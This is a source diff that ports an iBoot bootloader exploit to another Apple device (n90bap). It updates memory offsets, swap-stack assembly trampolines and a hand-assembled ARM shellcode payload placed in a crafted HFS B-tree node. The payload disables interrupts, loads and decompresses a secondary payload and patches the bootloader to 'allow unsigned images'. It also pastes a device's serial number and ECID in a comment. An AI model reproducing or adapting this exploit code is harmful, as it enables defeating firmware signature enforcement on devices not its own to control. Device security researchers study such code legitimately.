@@ -2,7 +2,7 @@
 #define IMAGE_START        0x5FF00000 //yes
 #define IMAGE_END          0x5FF50004 //yes
 #define IMAGE_SIZE         (IMAGE_END - IMAGE_START)
-#define IMAGE_HEAP_SIZE        0xAEFFA //should be right
+#define IMAGE_HEAP_SIZE        0xA6FFC //should be right
 #define IMAGE_BSS_START        0x5FF41640 //yes
 #define IMAGE_BSS_END          0x5FF50004 //yes
 #define IMAGE_TEXT_END        0x5FF50000 /* XXX this is a lie */
@@ -138,16 +138,16 @@ fuck1(void)
 #ifdef __arm__
     /* can use: r6, r10, r11 (r0, r1, r2) */
     __asm volatile (
-    "mov    r10, lr;"
-    "mov    r11, sp;"
-    "blx    _getstak;"        /* XXX hope it only destroys r0 */
-    "mov    sp, r0;"
-    "push   { r0-r12 };"
-    "blx    _real_fuck1;"
-    "pop    { r0-r12 };"
-    "mov    sp, r11;"
-    "add    r6, r4, #0x3f;" //todo
-    "bx     r10;"
+        "mov    r10, lr;"
+        "mov    r11, sp;"
+        "blx    _getstak;"        /* XXX hope it only destroys r0 */
+        "mov    sp, r0;"
+        "push   { r0-r12 };"
+        "blx    _real_fuck1;"
+        "pop    { r0-r12 };"
+        "mov    sp, r11;"
+        "add    r6, r4, #0x3f;" //todo
+        "bx     r10;"
     );
 #endif /* __arm__ */
 }
@@ -158,18 +158,18 @@ fuck2(void)
 #ifdef __arm__
     /* can use: r4, r10, r11 */
     __asm volatile (
-    "mov    r10, lr;"
-    "mov    r11, sp;"
-    "mov    r4, r0;"
-    "blx    _getstak;"        /* XXX hope it only destroys r0 */
-    "mov    sp, r0;"
-    "mov    r0, r4;"
-    "push   { r0-r12 };"
-    "blx    _real_fuck2;"
-    "pop    { r0-r12 };"
-    "mov    sp, r11;"
-    "sub    r4, r2, #0x40;" //todo
-    "bx     r10;"
+        "mov    r10, lr;"
+        "mov    r11, sp;"
+        "mov    r4, r0;"
+        "blx    _getstak;"        /* XXX hope it only destroys r0 */
+        "mov    sp, r0;"
+        "mov    r0, r4;"
+        "push   { r0-r12 };"
+        "blx    _real_fuck2;"
+        "pop    { r0-r12 };"
+        "mov    sp, r11;"
+        "sub    r4, r2, #0x40;" //todo
+        "bx     r10;"
     );
 #endif /* __arm__ */
 }
@@ -180,18 +180,18 @@ fuck3(void)
 #ifdef __arm__
     /* can use: r10, r11 (r2, r3, r5, r6) */
     __asm volatile (
-    "str    r0, [r8];"
-    "mov    r10, lr;"
-    "mov    r11, sp;"
-    "mov    r6, r0;"
-    "blx    _getstak;"        /* XXX hope it only destroys r0 */
-    "mov    sp, r0;"
-    "mov    r0, r6;"
-    "push   { r0-r12 };"
-    "blx    _real_fuck3;"
-    "pop    { r0-r12 };"
-    "mov    sp, r11;"
-    "bx     r10;"
+        "str    r0, [r8];"
+        "mov    r10, lr;"
+        "mov    r11, sp;"
+        "mov    r6, r0;"
+        "blx    _getstak;"        /* XXX hope it only destroys r0 */
+        "mov    sp, r0;"
+        "mov    r0, r6;"
+        "push   { r0-r12 };"
+        "blx    _real_fuck3;"
+        "pop    { r0-r12 };"
+        "mov    sp, r11;"
+        "bx     r10;"
     );
 #endif /* __arm__ */
 }
@@ -200,14 +200,21 @@ fuck3(void)
 void
 my_adjust_stack(void)
 {
-#if 0
-    CALL(malloc)(2048 - 64);
-#elif 0
-    int i;
-    for (i = 0; i < 16; i++) {
-    CALL(malloc)(64);
-    }
-#else
+    //stack is 0x5ff54894 at main task (the number at the second row)
+    /*
+     =======================================
+     ::
+     :: iBoot for n90bap, Copyright 2013, Apple Inc.
+     ::
+     ::    BUILD_TAG: 0
+     ::
+     ::    BUILD_STYLE: 5ff54894
+     ::
+     ::    USB_SERIAL_NUMBER: CPID:8930 CPRV:20 CPFM:03 SCEP:02 BDID:04 ECID:00000300A89CDD6E IBFL:1B SRNM:[DX4KRY0WDP0N]
+     ::
+     =======================================
+     */
+#if 1
     void *ptr;
     ptr = CALL(malloc)(2048 - 64);
     CALL(free)(ptr);
@@ -287,9 +294,9 @@ suck_sid(void)
 int
 my_readp(void *ih, void *buffer, long long offset, int length)
 {
-#define TREEDEPTH 0
-#define TRYFIRST 1
-#define TRYLAST 0
+#define TREEDEPTH 0 //works
+#define TRYFIRST 0
+#define TRYLAST 1 //works
     long long off;
     eprintf("%s(%p, %p, 0x%llx, %d)\n", __FUNCTION__, ih, buffer, offset, length);
 #if TRYLAST
@@ -351,53 +358,54 @@ my_readp(void *ih, void *buffer, long long offset, int length)
                 PUT_WORD_LE(buffer, 14, 0);                /* must be zero, to allow r3 to grow */
                 
 #if 1
-#define START_OF_BTREE_HEADER 0x0 //useless
-#define START_OF_EXTENTS_BTREE_HEADER 0x0
-#define ALIGNED_POINTER_OFFSET 0x0
+#define START_OF_BTREE_HEADER 0x44594 //useless
+#define START_OF_EXTENTS_BTREE_HEADER 0x44694
+#define ALIGNED_POINTER_OFFSET START_OF_EXTENTS_BTREE_HEADER + 0x14
+#define START_OF_SHELLCODE 0x446F0
 #endif
                 
                 PUT_DWORD_LE(buffer, 78, (uintptr_t)image + ALIGNED_POINTER_OFFSET);            /* *r2 = r4 */
-                PUT_DWORD_LE(buffer, 0x47E40 + 4 - 0x47E14, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
-                PUT_DWORD_LE(buffer, 0x47E40 + 0x40 - 0x47E14, (uintptr_t)image + 0x47E89);    /* r10 (code exec) */
-                PUT_DWORD_LE(buffer, 0x47E40 + 0x44 - 0x47E14, (uintptr_t)image + 0x47F84);    /* r11 -> lr */
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 4 - START_OF_EXTENTS_BTREE_HEADER, (NODE_SIZE + 0x40) >> 6);    /* *(r0 + 4) = r9 */
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x40 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446F1);    /* r10 (code exec) */ //yes
+                PUT_DWORD_LE(buffer, ALIGNED_POINTER_OFFSET + 0x44 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x446EC);    /* r11 -> lr */ //tocheck
 #if 0
-                PUT_WORD_LE(buffer, 0x47E88 + 0 - 0x47E14, INSNT_ILLEGAL);
+                PUT_WORD_LE(buffer, START_OF_SHELLCODE + 0 - START_OF_EXTENTS_BTREE_HEADER, INSNT_ILLEGAL);
 #else
-                PUT_DWORD_LE(buffer, 0x47E88 +   0 - 0x47E14, INSNW_LDR_SP_PC72);
-                PUT_DWORD_LE(buffer, 0x47E88 +   4 - 0x47E14, make_bl(0, 0x47E88 +  4, disable_interrupts_ADDR - 1));
-                PUT_WORD_LE(buffer,  0x47E88 +   8 - 0x47E14, INSNT_LDR_R_PC(4, 68));
-                PUT_WORD_LE(buffer,  0x47E88 +  10 - 0x47E14, INSNT_LDR_R_PC(0, 72));
-                PUT_WORD_LE(buffer,  0x47E88 +  12 - 0x47E14, INSNT_MOV_R_R(1, 4));
-                PUT_WORD_LE(buffer,  0x47E88 +  14 - 0x47E14, INSNT_LDR_R_PC(2, 72));
-                PUT_DWORD_LE(buffer, 0x47E88 +  16 - 0x47E14, make_bl(1, 0x47E88 + 16, bcopy_ADDR));
-                PUT_DWORD_LE(buffer, 0x47E88 +  20 - 0x47E14, INSNW_MOV_R1_2400);
-                PUT_DWORD_LE(buffer, 0x47E88 +  24 - 0x47E14, INSNW_STRH_R1_R4_E2C);
-                PUT_WORD_LE(buffer,  0x47E88 +  28 - 0x47E14, INSNT_LDR_R_PC(0, 60));
-                PUT_DWORD_LE(buffer, 0x47E88 +  30 - 0x47E14, INSNW_MOV_R1_40000000);
-                PUT_WORD_LE(buffer,  0x47E88 +  34 - 0x47E14, INSNT_STR_R1_R4_R0);
-                PUT_WORD_LE(buffer,  0x47E88 +  36 - 0x47E14, INSNT_LDR_R_PC(0, 56));
-                PUT_WORD_LE(buffer,  0x47E88 +  38 - 0x47E14, INSNT_LDR_R_PC(1, 60));
-                PUT_WORD_LE(buffer,  0x47E88 +  40 - 0x47E14, INSNT_STR_R1_R4_R0);
-                PUT_WORD_LE(buffer,  0x47E88 +  42 - 0x47E14, INSNT_LDR_R_PC(0, 60));
-                PUT_WORD_LE(buffer,  0x47E88 +  44 - 0x47E14, INSNT_MOV_R_I(1, 0xFC));
-                PUT_WORD_LE(buffer,  0x47E88 +  46 - 0x47E14, INSNT_LDR_R_PC(2, 60));
-                PUT_WORD_LE(buffer,  0x47E88 +  48 - 0x47E14, INSNT_MOV_R_I(3, nettoyeur_sz));
-                PUT_WORD_LE(buffer,  0x47E88 +  50 - 0x47E14, INSNT_PUSH_R0);
-                PUT_DWORD_LE(buffer, 0x47E88 +  52 - 0x47E14, make_bl(0, 0x47E88 + 52, decompress_lzss_ADDR - 1));
-                PUT_WORD_LE(buffer,  0x47E88 +  56 - 0x47E14, INSNT_LDR_R_PC(0, 52));
-                PUT_WORD_LE(buffer,  0x47E88 +  58 - 0x47E14, INSNT_BLX_R(0));
-                PUT_WORD_LE(buffer,  0x47E88 +  60 - 0x47E14, INSNT_MOV_R_R(14, 4));
-                PUT_WORD_LE(buffer,  0x47E88 +  62 - 0x47E14, INSNT_POP_PC);
-                PUT_DWORD_LE(buffer, 0x47E88 +  76 - 0x47E14, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
-                PUT_DWORD_LE(buffer, 0x47E88 +  80 - 0x47E14, (uintptr_t)image /* 0x44000000 */);
-                PUT_DWORD_LE(buffer, 0x47E88 +  84 - 0x47E14, (uintptr_t)image /* 0x5ff00000 */);
-                PUT_DWORD_LE(buffer, 0x47E88 +  88 - 0x47E14, IMAGE_BSS_START - IMAGE_START);
-                PUT_DWORD_LE(buffer, 0x47E88 +  92 - 0x47E14, 0x419F8 /* go command handler */);
-                PUT_DWORD_LE(buffer, 0x47E88 +  96 - 0x47E14, 0x191E4 /* allow unsigned images */);
-                PUT_DWORD_LE(buffer, 0x47E88 + 100 - 0x47E14, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
-                PUT_DWORD_LE(buffer, 0x47E88 + 104 - 0x47E14, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
-                PUT_DWORD_LE(buffer, 0x47E88 + 108 - 0x47E14, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
-                PUT_DWORD_LE(buffer, 0x47E88 + 112 - 0x47E14, (uintptr_t)suck_sid);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   0 - START_OF_EXTENTS_BTREE_HEADER, INSNW_LDR_SP_PC72);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +   4 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE +  4, disable_interrupts_ADDR - 1));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +   8 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(4, 68));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  10 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 72));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  12 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(1, 4));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  14 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 72));
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  16 - START_OF_EXTENTS_BTREE_HEADER, make_bl(1, START_OF_SHELLCODE + 16, bcopy_ADDR));
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  20 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_2400);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  24 - START_OF_EXTENTS_BTREE_HEADER, INSNW_STRH_R1_R4_E2C);
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  28 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  30 - START_OF_EXTENTS_BTREE_HEADER, INSNW_MOV_R1_40000000);
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  34 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  36 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 56));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  38 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(1, 60));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  40 - START_OF_EXTENTS_BTREE_HEADER, INSNT_STR_R1_R4_R0);
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  42 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 60));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  44 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(1, 0xFC));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  46 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(2, 60));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  48 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_I(3, nettoyeur_sz));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  50 - START_OF_EXTENTS_BTREE_HEADER, INSNT_PUSH_R0);
+                PUT_DWORD_LE(buffer, 0x47E88 +  52 - START_OF_EXTENTS_BTREE_HEADER, make_bl(0, START_OF_SHELLCODE + 52, decompress_lzss_ADDR - 1));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  56 - START_OF_EXTENTS_BTREE_HEADER, INSNT_LDR_R_PC(0, 52));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  58 - START_OF_EXTENTS_BTREE_HEADER, INSNT_BLX_R(0));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  60 - START_OF_EXTENTS_BTREE_HEADER, INSNT_MOV_R_R(14, 4));
+                PUT_WORD_LE(buffer,  START_OF_SHELLCODE +  62 - START_OF_EXTENTS_BTREE_HEADER, INSNT_POP_PC);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  76 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + IMAGE_SIZE + IMAGE_HEAP_SIZE + IMAGE_STACK_SIZE);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  80 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x44000000 */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  84 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image /* 0x5ff00000 */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  88 - START_OF_EXTENTS_BTREE_HEADER, IMAGE_BSS_START - IMAGE_START);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  92 - START_OF_EXTENTS_BTREE_HEADER, 0x3F378 /* go command handler */); //tocheck
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE +  96 - START_OF_EXTENTS_BTREE_HEADER, 0x19164 /* allow unsigned images */); //should be right
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 100 - START_OF_EXTENTS_BTREE_HEADER, INSN2_MOV_R0_0__STR_R0_R3 /* allow unsigned images */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 104 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x48000 /* nettoyeur uncompressed */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 108 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)image + 0x47d3c /* nettoyeur compressed */);
+                PUT_DWORD_LE(buffer, START_OF_SHELLCODE + 112 - START_OF_EXTENTS_BTREE_HEADER, (uintptr_t)suck_sid);
 #endif
                 break;
 #if TREEDEPTH
@@ -644,7 +652,7 @@ patch_image(unsigned char *image)
     *(uint16_t *)(image + 0x1E452) = INSNT_NOP;
     /* task switch FPU */
     *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0; //yes
-    *(uint32_t *)(image + 0x20338) = INSNA_MOV_R2_0; //doubled?
+    *(uint32_t *)(image + 0x20368) = INSNA_MOV_R2_0; //yes
     /* bzero during mmu_init */
     *(uint32_t *)(image + 0x1F5F0) = INSN2_NOP__NOP; //yes
     /* nop some calls during iboot_start */
